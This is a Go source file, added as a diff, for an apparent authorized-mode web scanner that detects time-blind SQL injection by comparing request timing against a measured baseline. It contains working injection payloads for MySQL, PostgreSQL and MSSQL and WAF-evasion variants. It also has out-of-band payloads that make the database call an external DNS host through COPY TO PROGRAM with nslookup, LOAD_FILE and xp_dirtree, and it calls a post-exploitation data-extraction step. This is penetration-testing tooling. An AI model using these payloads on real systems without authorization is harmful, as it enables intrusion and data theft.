@@ -1,0 +1,346 @@
+// Package sqli implements a time-blind SQL injection scanner with calibration-based
+// timing analysis. Unlike sqlmap's simple threshold, this scanner:
+//
+//  1. Measures baseline latency (5 requests, takes median)//  2. Injects SLEEP(3) — verifies delta > 2.5s over baseline
+//  3. Confirms with SLEEP(5) — verifies delta tracks proportionally
+//
+// This dual-sleep confirmation eliminates false positives from slow servers,
+// network jitter, or rate limiting. Only runs in authorized mode.
+package sqli
+
+import (
+	"context"
+	"crypto/tls"
+	"fmt"
+	"io"
+	"net/http"
+	"net/url"
+	"sort"
+	"strings"
+	"time"
+
+	"github.com/stormbane-security/beacon/internal/evasion"
+	"github.com/stormbane-security/beacon/internal/finding"
+	"github.com/stormbane-security/beacon/internal/module"
+	"github.com/stormbane-security/beacon/internal/oob"
+	"github.com/stormbane-security/beacon/internal/scan"
+	"github.com/stormbane-security/beacon/internal/scanner/authctx"
+)
+
+
+func init() {
+	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
+		return New()
+	},
+		scan.Check(finding.CheckExploitCredentialHarvest, finding.SeverityCritical, finding.ModeDeep),
+		scan.Check(finding.CheckExploitDataExtracted, finding.SeverityCritical, finding.ModeDeep),
+		scan.Check(finding.CheckWebSQLi, finding.SeverityCritical, finding.ModeDeep),
+	)
+}
+const scannerName = "sqli"
+
+// Payloads organized by database type. Each contains a SLEEP/WAITFOR/pg_sleep
+// call that will be parameterized with the desired delay.
+type payload struct {
+	name    string // e.g., "mysql-sleep"
+	dbType  string // mysql, postgres, mssql, sqlite
+	prefix  string // characters before the sleep call
+	sleepFn string // the sleep function template (%d = seconds)
+	suffix  string // characters after the sleep call
+}
+
+var payloads = []payload{
+	// MySQL — AND-based payloads first: SLEEP runs exactly once on the
+	// matching row, avoiding N×SLEEP timeouts on multi-row tables.
+	{name: "mysql-and-sleep-quote", dbType: "mysql", prefix: "1' AND SLEEP(", sleepFn: "%d", suffix: ") AND '1'='1"},
+	{name: "mysql-and-sleep-num", dbType: "mysql", prefix: "1 AND SLEEP(", sleepFn: "%d", suffix: ")-- -"},
+
+	// MySQL — OR-based (catches cases where id=1 doesn't match)
+	{name: "mysql-sleep-quote", dbType: "mysql", prefix: "' OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
+	{name: "mysql-sleep-num", dbType: "mysql", prefix: "1 OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
+
+	// PostgreSQL
+	{name: "pg-sleep-quote", dbType: "postgres", prefix: "'; SELECT pg_sleep(", sleepFn: "%d", suffix: ");-- -"},
+	{name: "pg-sleep-num", dbType: "postgres", prefix: "1; SELECT pg_sleep(", sleepFn: "%d", suffix: ");-- -"},
+
+	// MSSQL
+	{name: "mssql-waitfor-quote", dbType: "mssql", prefix: "'; WAITFOR DELAY '0:0:", sleepFn: "%d", suffix: "'-- -"},
+	{name: "mssql-waitfor-num", dbType: "mssql", prefix: "1; WAITFOR DELAY '0:0:", sleepFn: "%d", suffix: "'-- -"},
+}
+
+// Paths and parameters commonly vulnerable to SQLi.
+var probePaths = []struct {
+	path   string
+	params []string
+}{
+	{"/", []string{"id", "page", "cat", "item"}},
+	{"/api/v1/users", []string{"id", "user_id"}},
+	{"/search", []string{"q", "query", "search", "keyword"}},
+	{"/product", []string{"id", "pid", "product_id"}},
+	{"/article", []string{"id", "article_id"}},
+	{"/news", []string{"id", "nid"}},
+	{"/login", []string{"username", "user"}},
+}
+
+// Scanner checks for time-blind SQL injection.
+type Scanner struct{}
+
+func New() *Scanner { return &Scanner{} }
+
+func (s *Scanner) Name() string { return scannerName }
+
+func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
+	if scanType != module.ScanAuthorized {
+		return nil, nil
+	}
+
+	ac := authctx.HTTPClient(ctx)
+	transport := ac.Transport
+	if transport == nil {
+		transport = &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		}
+	}
+	client := &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: transport,
+		Jar:       ac.Jar,
+	}
+
+	// Determine working scheme
+	scheme := detectScheme(ctx, client, asset)
+	if scheme == "" {
+		return nil, nil
+	}
+
+	var findings []finding.Finding
+
+	for _, pp := range probePaths {
+		if ctx.Err() != nil {
+			break
+		}
+
+		for _, param := range pp.params {
+			if ctx.Err() != nil {
+				break
+			}
+
+			baseURL := fmt.Sprintf("%s://%s%s?%s=1", scheme, asset, pp.path, param)
+
+			// Step 1: Measure baseline latency
+			baseline, err := measureBaseline(ctx, client, baseURL, 5)
+			if err != nil {
+				continue
+			}
+
+			// Step 2: Try time-based payloads
+			for _, p := range payloads {
+				if ctx.Err() != nil {
+					break
+				}
+
+				// First probe: SLEEP(3) — try original + WAF evasion variants.
+				injected3 := buildPayload(p, 3)
+
+				candidates := []string{injected3}
+				candidates = append(candidates, evasion.SQLBypass(injected3)...)
+
+				var confirmedURL3 string
+				var confirmedDelta3 time.Duration
+				var confirmedLabel string
+				var confirmedIdx int
+
+				for ci, candidate := range candidates {
+					if ctx.Err() != nil {
+						break
+					}
+					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(candidate))
+					latency, err := timeRequest(ctx, client, testURL)
+					if err != nil {
+						continue
+					}
+					delta := latency - baseline
+					if delta >= 2500*time.Millisecond {
+						confirmedURL3 = testURL
+						confirmedDelta3 = delta
+						confirmedIdx = ci
+						if ci == 0 {
+							confirmedLabel = p.name
+						} else {
+							confirmedLabel = fmt.Sprintf("%s+evasion-%d", p.name, ci)
+						}
+						break
+					}
+				}
+
+				if confirmedURL3 == "" {
+					continue // not significantly slower
+				}
+
+				// Step 3: Confirm with SLEEP(5) — delta should be ~5s over baseline.
+				// Use the same evasion variant that worked for SLEEP(3), otherwise
+				// a WAF that blocked the original will also block the confirmation.
+				injected5 := buildPayload(p, 5)
+				candidates5 := []string{injected5}
+				candidates5 = append(candidates5, evasion.SQLBypass(injected5)...)
+				confirm5 := injected5
+				if confirmedIdx < len(candidates5) {
+					confirm5 = candidates5[confirmedIdx]
+				}
+				testURL5 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(confirm5))
+				latency5, err := timeRequest(ctx, client, testURL5)
+				if err != nil {
+					continue
+				}
+
+				delta5 := latency5 - baseline
+				if delta5 < 4500*time.Millisecond {
+					continue // didn't track proportionally
+				}
+
+				// Both deltas confirmed — this is real SQLi
+				findings = append(findings, finding.Finding{
+					CheckID:  finding.CheckWebSQLi,
+					Module:   "deep",
+					Scanner:  scannerName,
+					Severity: finding.SeverityCritical,
+					Title:    fmt.Sprintf("Time-blind SQL injection in %s parameter at %s", param, pp.path),
+					Description: fmt.Sprintf(
+						"Calibration-based timing analysis confirmed SQL injection. "+
+							"Baseline: %s, SLEEP(3) delta: %s, SLEEP(5) delta: %s. "+
+							"Database type: %s. Payload: %s",
+						baseline.Round(time.Millisecond), confirmedDelta3.Round(time.Millisecond),
+						delta5.Round(time.Millisecond), p.dbType, confirmedLabel),
+					Asset:    asset,
+					DeepOnly: true,
+					Evidence: map[string]any{
+						"path":            pp.path,
+						"parameter":       param,
+						"payload":         confirmedLabel,
+						"db_type":         p.dbType,
+						"baseline_ms":     baseline.Milliseconds(),
+						"sleep3_delta_ms": confirmedDelta3.Milliseconds(),
+						"sleep5_delta_ms": delta5.Milliseconds(),
+						"waf_bypass":      confirmedLabel != p.name,
+					},
+					ProofCommand: fmt.Sprintf(
+						`time curl -sk '%s'  # should take ~3s longer than baseline`,
+						confirmedURL3),
+					DiscoveredAt: time.Now(),
+				})
+
+				// Post-exploitation: attempt data extraction
+				postFindings := postExploit(ctx, client, asset, scheme, pp.path, param, p.dbType)
+				findings = append(findings, postFindings...)
+
+				// One confirmed SQLi per parameter is enough
+				break
+			}
+
+			// Try OOB-based detection if available
+			if oobSrv := oob.FromContext(ctx); oobSrv != nil {
+				token := oobSrv.GenerateToken(fmt.Sprintf("sqli-%s-%s", pp.path, param))
+				oobDomain := oobSrv.DNSHostname(token)
+
+				oobPayloads := []string{
+					fmt.Sprintf("' AND 1=LOAD_FILE('\\\\\\\\%s\\\\a')-- -", oobDomain),
+					fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", oobDomain),
+					fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", oobDomain),
+				}
+
+				for _, op := range oobPayloads {
+					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(op))
+					_, _ = timeRequest(ctx, client, testURL)
+				}
+
+				// Check for OOB callback (brief wait)
+				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
+					findings = append(findings, finding.Finding{
+						CheckID:  finding.CheckWebSQLi,
+						Module:   "deep",
+						Scanner:  scannerName,
+						Severity: finding.SeverityCritical,
+						Title:    fmt.Sprintf("OOB SQL injection confirmed in %s at %s", param, pp.path),
+						Description: fmt.Sprintf(
+							"Out-of-band DNS callback received from %s, confirming SQL injection. "+
+								"Protocol: %s", cb.RemoteAddr, cb.Protocol),
+						Asset:    asset,
+						DeepOnly: true,
+						Evidence: map[string]any{
+							"path":        pp.path,
+							"parameter":   param,
+							"oob_token":   token,
+							"callback_ip": cb.RemoteAddr,
+							"protocol":    cb.Protocol,
+						},
+						DiscoveredAt: time.Now(),
+					})
+				}
+			}
+		}
+	}
+
+	return findings, nil
+}
+
+func buildPayload(p payload, seconds int) string {
+	sleep := fmt.Sprintf(p.sleepFn, seconds)
+	return p.prefix + sleep + p.suffix
+}
+
+// measureBaseline sends N requests and returns the median latency.
+func measureBaseline(ctx context.Context, client *http.Client, url string, n int) (time.Duration, error) {
+	var latencies []time.Duration
+	for i := 0; i < n; i++ {
+		d, err := timeRequest(ctx, client, url)
+		if err != nil {
+			return 0, err
+		}
+		latencies = append(latencies, d)
+	}
+	sort.Slice(latencies, func(i, j int) bool { return latencies[i] < latencies[j] })
+	return latencies[len(latencies)/2], nil // median
+}
+
+// timeRequest measures how long an HTTP GET takes.
+func timeRequest(ctx context.Context, client *http.Client, rawURL string) (time.Duration, error) {
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
+	if err != nil {
+		return 0, err
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; beacon-sqli-scanner)")
+
+	start := time.Now()
+	resp, err := client.Do(req)
+	elapsed := time.Since(start)
+	if err != nil {
+		return elapsed, err
+	}
+	_, _ = io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
+
+	return elapsed, nil
+}
+
+func detectScheme(ctx context.Context, client *http.Client, asset string) string {
+	// Strip port if present to determine default
+	host := asset
+	if idx := strings.LastIndex(asset, ":"); idx != -1 {
+		host = asset[:idx]
+	}
+	_ = host
+
+	for _, scheme := range []string{"https", "http"} {
+		req, err := http.NewRequestWithContext(ctx, http.MethodHead, scheme+"://"+asset+"/", nil)
+		if err != nil {
+			continue
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		resp.Body.Close()
+		return scheme
+	}
+	return ""
+}
